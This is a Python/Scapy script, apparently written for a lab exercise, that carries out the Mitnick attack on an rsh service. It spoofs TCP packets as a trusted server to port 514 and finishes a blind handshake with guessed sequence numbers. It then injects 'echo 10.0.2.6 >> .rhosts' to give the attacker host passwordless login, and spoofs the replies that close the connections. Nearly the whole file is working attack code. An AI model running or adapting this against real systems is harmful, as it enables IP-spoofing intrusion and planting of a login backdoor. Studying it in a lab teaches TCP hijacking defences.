#!/usr/bin/python3
from scapy.all import *

# 10.0.2.4 X-Terminal Have all codes
# 10.0.2.6 Attacker Want to get those codes
# 10.0.2.15 Server Can login into X-Terminal  by rsh


# spoof a packet in disguise of server
ip1 = IP(src = "10.0.2.15", dst = "10.0.2.4")		#dest IP address
tcp1 = TCP(sport = 1023, dport = 514, seq=1778, flags = 'S') # RSH dedicated 514
pkt1 = ip1/tcp1
send(pkt1, verbose = 0)


# sniff reply msg from terminal and spoof
def sniff_spoof(pkt):
    ip_part = pkt[IP]
    tcp_part = pkt[TCP]

    if 'S' in tcp_part.flags and 'A' in tcp_part.flags:
        newseq2 = 1779
        newack2 = tcp_part.seq + 1
        ip2 = IP(src = "10.0.2.15", dst = "10.0.2.4")
        tcp2 = TCP(sport = 1023, dport = 514, seq=newseq2, ack=newack2, flags = 'A')
        pkt2 = ip2/tcp2
        send(pkt2, verbose=0)

    ip3 = IP(src = "10.0.2.15", dst = "10.0.2.4")
    tcp3 = TCP(sport = 1023, dport = 514, seq=newseq2, ack=newack2, flags = 'A')
    data3 = '9090\x00seed\x00seed\x00echo 10.0.2.6 >> .rhosts\x00'
    pkt3 = ip3/tcp3/data3
    send(pkt3, verbose=0)


myFilter1 = 'tcp and src host 10.0.2.4 and dst host 10.0.2.15'
sniff(filter=myFilter1, prn=sniff_spoof, count = 1)


def sniff_spoof_2(pkt):
    ip_part_2 = pkt[IP]
    tcp_part_2 = pkt[TCP]
    print(tcp_part_2.seq)
    # print(tcp_part.ack)
    if 'S' in tcp_part_2.flags:
        newseq4= 78944
        newack4= tcp_part_2.seq + 1
        ip4 = IP(src = "10.0.2.15", dst = "10.0.2.4")
        tcp4 = TCP(sport = 9090, dport = 1023, seq=newseq4, ack=newack4, flags = 'AS')
        pkt4 = ip4/tcp4
        send(pkt4, verbose=0)

myFilter2 = 'tcp and src host 10.0.2.4 and dst host 10.0.2.15 and dst port 9090'
sniff(filter=myFilter2, prn=sniff_spoof_2, count = 1)

# ------------- Mitnik done
# ------------- For sake of convenience lets close the TCP conn

def sniff_spoof_3(pkt):
    ip_part_3 = pkt[IP]
    tcp_part_3 = pkt[TCP]
    # print(tcp_part_3.seq)
    if 'F' in tcp_part_3.flags and 'A' in tcp_part_3.flags:
        newack5 = tcp_part_3.seq+1
        newseq5 = tcp_part_3.ack
        ip5 = IP(src = "10.0.2.15", dst = "10.0.2.4")
        tcp5 = TCP(sport = 9090, dport = 1023, seq=newseq5, ack=newack5, flags = 'AF')
        pkt5 = ip5/tcp5
        send(pkt5, verbose=0)

myFilter3 = 'tcp and src host 10.0.2.4 and dst host 10.0.2.15 and src port 1023 and dst port 9090'
sniff(filter=myFilter3, prn=sniff_spoof_3, count = 1)


def sniff_spoof_4(pkt):
    ip_part_4 = pkt[IP]
    tcp_part_4 = pkt[TCP]
    # print(tcp_part_4.seq)
    if 'F' in tcp_part_4.flags and 'A' in tcp_part_4.flags:
        newack6 = tcp_part_4.seq+1
        newseq6 = tcp_part_4.ack
        ip6 = IP(src = "10.0.2.15", dst = "10.0.2.4")
        tcp6 = TCP(sport = 1023, dport = 514, seq=newseq6, ack=newack6, flags = 'AF')
        pkt6 = ip6/tcp6
        send(pkt6, verbose=0)

myFilter4 = 'tcp and src host 10.0.2.4 and dst host 10.0.2.15 and src port 514 and dst port 1023'
sniff(filter=myFilter4, prn=sniff_spoof_4, count = 1)
